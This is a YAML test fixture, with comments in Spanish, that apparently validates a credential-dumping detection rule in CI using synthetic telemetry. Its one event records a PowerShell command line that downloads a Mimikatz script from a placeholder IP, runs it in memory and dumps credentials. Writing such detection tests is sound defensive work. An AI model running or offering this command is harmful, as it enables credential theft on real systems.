# Escenarios de validacion de deteccion (SIM-1/SIM-2).
# Telemetria sintetica e inerte: el mismo esquema de eventos que
# envia el sensor, sin ejecutar nada en ningun equipo. Cada escenario
# declara las alertas que el motor DEBE disparar (shipped rule/sequence
# id); el test de CI falla si una deja de detectarse.

- name: Herramienta de volcado Mimikatz (sintetico)
  id: sim-mimikatz
  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: herramienta
    de volcado Mimikatz. Telemetria inerte; nada se ejecuta en ningun equipo.'
  attack:
  - t1003.001
  host: LAB-SIM-MIMIKATZ
  user: CORP\sim
  expected:
  - rule: a1b2c3d4-0001-4a01-9e01-010101010101
  events:
  - type: process.create
    user: CORP\sim
    process:
      pid: 4170
      name: powershell.exe
      command_line: powershell.exe -c "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.10/mimikatz.ps1');
        Invoke-Mimikatz -DumpCreds"
